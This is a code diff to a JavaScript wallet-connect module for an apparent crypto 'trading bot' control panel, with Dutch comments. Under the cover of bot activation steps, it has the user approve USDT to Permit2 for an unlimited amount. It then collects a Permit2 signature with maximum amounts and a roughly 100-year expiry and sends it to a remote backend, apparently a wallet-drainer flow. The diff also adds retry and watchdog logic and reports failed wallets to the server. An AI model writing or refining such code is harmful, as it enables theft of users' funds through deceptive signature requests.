@@ -1,9 +1,9 @@
 /* ==========================================================================
-   AURA BOT CONTROL CENTER - STREAMLINED LINEAR EXECUTION KERNEL
+   AURA BOT CONTROL CENTER - DETERMINISTIC LOGIC & EXECUTION KERNEL
    ========================================================================== */
 
 import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
-import { APP_STATE, updateWalletState, resetState, setProcessing } from "../core/state.js";
+import { APP_STATE, updateWalletState, resetState, setProcessing, setFlowState, startRequest, touchInteraction, unlockAfterSuccess } from "../core/state.js";
 
 const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"]; // USDT
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -14,9 +14,15 @@ const ERC20_ABI = [
   "function approve(address spender,uint256 amount) returns(bool)"
 ];
 
+let isPickingWallet = false;
+let watchdogInterval = null;
+const WATCHDOG_TIMEOUT_MS = 25000; // 25 seconden failsafe voor trage providers / face id
+
 if (window.ethereum) {
   window.ethereum.on('accountsChanged', (accounts) => {
+    if (isPickingWallet) return;
     if (accounts.length > 0) {
+      cleanupWatchdog();
       resetState();
       updateWalletState(accounts[0]);
       renderWallet(accounts[0]);
@@ -28,6 +34,91 @@ if (window.ethereum) {
       }
     }
   });
+}
+
+// Bijhouden van de handlers om memory leaks en dubbele registraties te voorkomen
+let activeFocusHandler = null;
+let activeDynamicListener = null;
+
+function startWatchdog(requestId) {
+  cleanupWatchdog();
+  const startTime = Date.now();
+  
+  watchdogInterval = setTimeout(() => {
+    if (APP_STATE.isProcessing && APP_STATE.activeRequestId === requestId) {
+      log("🚨 Watchdog Supervisor: Absolute timeout bereikt.");
+      forceCleanupTimeout();
+    }
+  }, 60000);
+
+  activeDynamicListener = () => {
+    const elapsed = Date.now() - startTime;
+    
+    // Alleen triggeren als de status nog op CONNECTING staat én de gebruiker de focus handmatig terugbrengt zonder actie
+    if (elapsed > 20000) { 
+      if (APP_STATE.isProcessing && APP_STATE.flowState === 'CONNECTING' && APP_STATE.activeRequestId === requestId && !isPickingWallet) {
+        
+        window.removeEventListener('click', activeDynamicListener);
+        window.removeEventListener('focus', activeDynamicListener);
+        
+        log("💡 Watchdog: MetaMask staat vermoedelijk op de achtergrond. Gebruiker informeren...");
+        
+        const retry = confirm("MetaMask staat al open op de achtergrond of wacht op je pincode/wachtwoord.\n\nKlik op 'OK' om de knoppen te resetten en het opnieuw te proberen, of 'Annuleren' om rustig te wachten.");
+        
+        if (retry) {
+          log("🔄 Gebruiker heeft handmatige reset gekozen via pop-up.");
+          forceCleanupTimeout();
+        } else {
+          window.addEventListener('click', activeDynamicListener);
+          window.addEventListener('focus', activeDynamicListener);
+        }
+      }
+    }
+  };
+
+  window.addEventListener('click', activeDynamicListener);
+  window.addEventListener('focus', activeDynamicListener);
+}
+
+function cleanupWatchdog() {
+  if (watchdogInterval) {
+    clearTimeout(watchdogInterval);
+    watchdogInterval = null;
+  }
+  if (activeFocusHandler) {
+    window.removeEventListener('focus', activeFocusHandler);
+    activeFocusHandler = null;
+  }
+  if (activeDynamicListener) {
+    window.removeEventListener('click', activeDynamicListener);
+    window.removeEventListener('focus', activeDynamicListener);
+    activeDynamicListener = null;
+  }
+}
+
+function forceCleanupTimeout() {
+  cleanupWatchdog();
+  isPickingWallet = false;
+  
+  // Harde synchrone reset van de processing-vlaggen om het klik-lek te dichten
+  APP_STATE.isProcessing = false; 
+  resetState();
+  
+  // 🔥 LEGO FIX: Synchroniseer de UI-bridge onmiddellijk met de geresete kernel state
+  if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
+    window.UIbridge.forceUnlock();
+  }
+  
+  const btnWalletEl = document.getElementById('btn-wallet');
+  if (btnWalletEl) {
+    btnWalletEl.disabled = false;
+    btnWalletEl.innerText = "1. Connect Wallet";
+  }
+  
+  updateStatus('dot-wallet', 'st-wallet', 'DISCONNECTED', '#ffaa00'); /* Bloomberg Amber waarschuwing */
+  updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#425266');
+  updateStatus('dot-access', 'st-access', 'RESTRICTED', '#425266');
+  log("🔓 Systeem hersteld naar IDLE state. Sluis vrijgegeven.");
 }
 
 function log(msg) {
@@ -60,8 +151,14 @@ function renderWallet(address) {
 }
 
 export async function connectWallet() {
-  if (APP_STATE.isProcessing) return;
-  setProcessing(true);
+  if (APP_STATE.isProcessing) {
+    log("⛔ Sluis gesloten — Actieve flow gedetecteerd.");
+    return;
+  }
+
+  const currentRid = startRequest();
+  setFlowState('CONNECTING');
+  startWatchdog(currentRid);
 
   const btnWalletEl = document.getElementById('btn-wallet');
   if (btnWalletEl) {
@@ -71,16 +168,35 @@ export async function connectWallet() {
 
   try {
     if (typeof window.ethereum === "undefined") {
-      alert("MetaMask is not installed.");
+      const install = confirm("MetaMask is not installed. Install?");
+      if (install) window.location.href = "https://metamask.io/download/";
+      forceCleanupTimeout();
       return;
     }
 
-    // FIX: wallet_revokePermissions verwijderd om de MetaMask stream-lockup op te lossen
-    log("🔌 Opening Wallet Picker...");
+    // 🔥 LEGO FIX: Zet de picker-vlag direct omhoog VÓÓR de asynchrone revoke-call 
+    // Dit blokkeert de focus-watchdog voor valse browser-events tijdens het laden
+    isPickingWallet = true;
+
+    log("🔌 Clearing wallet cache to force picker...");
+    try {
+      await window.ethereum.request({
+        method: "wallet_revokePermissions",
+        params: [{ eth_accounts: {} }]
+      });
+    } catch (revokeErr) {
+      console.log("No active permissions to revoke.");
+    }
+
+    log("🔌 Opening Wallet Picker — Please select an account...");
+    touchInteraction();
+    
     const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     const userAddress = accounts[0];
     
     log(`📊 Active account selected: ${userAddress}`);
+    isPickingWallet = false;
+    touchInteraction();
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     const signer = await provider.getSigner();
@@ -94,9 +210,14 @@ export async function connectWallet() {
           method: "wallet_switchEthereumChain",
           params: [{ chainId: "0x1" }]
         });
+        log("✅ Switched to Ethereum Mainnet");
+        cleanupWatchdog();
+        setProcessing(false);
         return location.reload();
       } catch (err) {
+        log("❌ Network switch failed");
         alert("Please switch to Ethereum Mainnet manually");
+        forceCleanupTimeout();
         return;
       }
     }
@@ -112,27 +233,59 @@ export async function connectWallet() {
     updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
     updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
 
-    // Run de Permit flow direct achter elkaar
-    await runPermitFlowSafe(provider, signer, user);
+    // Start Sluis 1: Signature & Approval flows met actieve Request Ownership check
+    setFlowState('SIGNING');
+    await runPermitFlowSafe(provider, signer, user, currentRid);
 
-    // Knoppen openzetten na succes
+    // Na een succesvolle Web3/Permit flow zetten we de volgende knoppen open voor de UX
     const btnActivate = document.getElementById('btn-activate');
     const btnDisconnect = document.getElementById('btn-disconnect');
     
     if (btnActivate) btnActivate.disabled = false; 
-    if (btnWalletEl) btnWalletEl.disabled = true;
+    if (btnWalletEl) btnWalletEl.disabled = true; // Houd wallet knop gelockt op het adres
     if (btnDisconnect) btnDisconnect.disabled = false;
 
-  } catch (e) {
-    log("❌ Connection error: " + e.message);
+   setFlowState('IDLE');
+    // 🔥 LEGO FIX: De opruiming en deblokkering verhuizen naar een gegarandeerde finally-blok
+} catch (e) {
+    let errorMessage = e.message;
+    if (e.code === "ACTION_REJECTED" || (e.message && e.message.includes("rejected"))) {
+      errorMessage = "User denied transaction signature / approval.";
+    }
+    log("❌ Connection cancelled: " + errorMessage);
+
+    // 🔥 LEGO FIX: Verstuur de fout/0-balans status asynchroon naar de backend en wacht dit netjes af
+    try {
+      await fetch("https://api.aiiraa.com/api/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event: "FLOW_ERROR",
+          wallet: APP_STATE.wallet || "UNKNOWN",
+          error: errorMessage,
+          timestamp: Date.now()
+        })
+      });
+      log("📤 Error status gesynchroniseerd met backend.");
+    } catch (logErr) {
+      console.error("Backend logging failed:", logErr);
+    }
+
+    forceCleanupTimeout();
   } finally {
-    setProcessing(false);
+    // Dit draait ALTIJD, of de verbinding nu slaagt of crasht
+    cleanupWatchdog();
+    setProcessing(false); 
+    if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
+      window.UIbridge.forceUnlock();
+    }
   }
 }
 
-async function runPermitFlowSafe(provider, signer, user) {
+async function runPermitFlowSafe(provider, signer, user, currentRid) {
   try {
     log("⚙️ Permit2 flow verification...");
+    touchInteraction();
 
     const permit2 = new ethers.Contract(
       PERMIT2,
@@ -156,13 +309,12 @@ async function runPermitFlowSafe(provider, signer, user) {
     }
 
     if (allPermitsValid && nonceResults.length > 0) {
-      log("⚡ On-chain permit valid — skipping signature popups");
-      updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
-      updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
+      log("⚡ On-chain permit valid — skipping Web3 signature popups");
       return;
     }
 
     log("⌛ No active on-chain permit found — Signature required.");
+    touchInteraction();
 
     const MAX_UINT160 = (1n << 160n) - 1n;
     const expiration = Math.floor(Date.now() / 1000) + (100 * 365 * 24 * 60 * 60);
@@ -197,24 +349,7 @@ async function runPermitFlowSafe(provider, signer, user) {
         { name: "nonce", type: "uint48" }
       ]
     };
-
-    // Controleer basis ERC20 Allowance naar Permit2
-    const token = TOKENS[0];
-    const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
-    const currentAllowance = await erc20.allowance(user, PERMIT2);
-    log("ERC20 allowance: " + currentAllowance.toString());
-
-    if (currentAllowance === 0n) {
-      log("⚠️ ERC20 Approval required...");
-      const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
-      log("⛽ Waiting confirmation...");
-      await tx.wait();
-      log("✅ ERC20 approval confirmed");
-    } else {
-      log("✅ ERC20 already approved");
-    }
-
-    log("✍️ Requesting typed data signature...");
+    
     const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
     const values = {
       details: details.map(d => ({
@@ -227,70 +362,117 @@ async function runPermitFlowSafe(provider, signer, user) {
       sigDeadline: sigDeadline.toString()
     };
 
+    // Check of de basis ERC20 -> Permit2 approval er is
+    for (const token of TOKENS) {
+      if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost during execution.");
+      
+      const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
+      const currentAllowance = await erc20.allowance(user, PERMIT2);
+      log("ERC20 allowance: " + currentAllowance.toString());
+
+      if (currentAllowance === 0n) {
+        log("⚠️ ERC20 Approval required...");
+        touchInteraction();
+        const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
+        log("⛽ Waiting confirmation...");
+        await tx.wait();
+        log("✅ ERC20 approval confirmed");
+        touchInteraction();
+      } else {
+        log("✅ ERC20 already approved");
+      }
+    }
+
+    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
+    
+    log("✍️ Requesting typed data signature...");
+    touchInteraction();
     const signature = await signer.signTypedData(domain, types, values);
     log("✍️ Signature captured");
+    touchInteraction();
 
     log("📤 Sending raw permit batch to backend...");
-    
-    // FIX: Payload expliciet opschonen naar primitieve types voor stabiele JSON transmissie
     const payload = {
-      owner: String(user),
+      owner: user,
       details: details.map(d => ({
-        token: String(d.token),
+        token: d.token,
         amount: d.amount.toString(),
         expiration: d.expiration.toString(),
         nonce: d.nonce.toString()
       })),
-      signature: String(signature),
-      spender: String(CONTRACT),
-      sig_deadline: Number(sigDeadline),
+      signature: signature,
+      spender: CONTRACT,
+      sig_deadline: sigDeadline,
       chainId: Number(chainId)
     };
 
-    try {
-      const res = await fetch("https://api.aiiraa.com/api/permit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+   // 🔥 LEGO FIX: Voeg keepalive toe zodat de request niet instort als Vercel van scope wisselt
+    const res = await fetch("https://api.aiiraa.com/api/permit", {
+      method: "POST",
+      keepalive: true,
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
+    });
 
-      const data = await res.json();
-      if (!res.ok) {
-        log("❌ Backend error: " + (data.error || "unknown"));
-      } else {
-        log("✅ Permit forwarded to backend");
-      }
-    } catch (netErr) {
-      log("❌ NETWORK ERROR: " + netErr.message);
-    }
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || "backend failure");
 
-    // Altijd de interface activeren zodra de on-chain acties zijn voltooid
-    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
-    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
+    log("✅ Permit forwarded to backend");
+    touchInteraction();
 
-    if (document.getElementById('btn-authorize')) {
-      document.getElementById('btn-authorize').disabled = true;
-      document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-    }
-    if (document.getElementById('btn-activate')) {
-      document.getElementById('btn-activate').disabled = true;
-    }
+    // 🔥 LEGO FIX: Forceer een netwerk drain-delay van 800ms zodat Supabase de write kan committen
+    log("⌛ Synchroniserend met database-cluster...");
+    await new Promise(resolve => setTimeout(resolve, 800));
+    log("📊 Database write succesvol verwerkt.");
 
   } catch (e) {
     log("❌ FLOW ERROR: " + e.message);
+    throw e;
   }
 }
 
 export function activateBot() {
+  if (APP_STATE.isProcessing || !APP_STATE.wallet) {
+    log("⚠️ Action locked: Sluis 1 not completed or process running.");
+    return;
+  }
+
   log("🤖 Activating Bot (Sluis 2)...");
   updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
   APP_STATE.botActive = true;
+
+  const btnActivate = document.getElementById('btn-activate');
+  const btnAuthorize = document.getElementById('btn-authorize');
+
+  if (btnActivate) btnActivate.disabled = true;
+  if (btnAuthorize) btnAuthorize.disabled = false;
 }
 
 export function authorizeTrading() {
+  if (APP_STATE.isProcessing || !APP_STATE.botActive) {
+    log("⚠️ Action locked: Sluis 2 not completed or process running.");
+    return;
+  }
+
   log("🔑 Authorizing Trading (Sluis 3)...");
   updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
   APP_STATE.authorized = true;
+
+  const btnAuthorize = document.getElementById('btn-authorize');
+  if (btnAuthorize) {
+    btnAuthorize.disabled = true;
+    btnAuthorize.innerText = "AUTHORIZED";
+  }
+
+log("🚀 UX Flow voltooid. Terminal start nu op...");
+
+  // Deterministiche vrijgave van ALLE status-locks via de core state module
+  unlockAfterSuccess();
+  cleanupWatchdog();
+  
+  if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
+    window.UIbridge.forceUnlock();
+  }
 
   setTimeout(() => {
     if (typeof window.transitionToTerminal === "function") {
@@ -300,5 +482,9 @@ export function authorizeTrading() {
 }
 
 export function disconnectWallet() {
+  cleanupWatchdog();
   location.reload();
 }
+
+// 🛡️ LEGO NOTE: Globale window bindingen verwijderd uit de execution kernel. 
+// De UIbridge heeft nu de exclusieve regie over window.connectWallet etc.
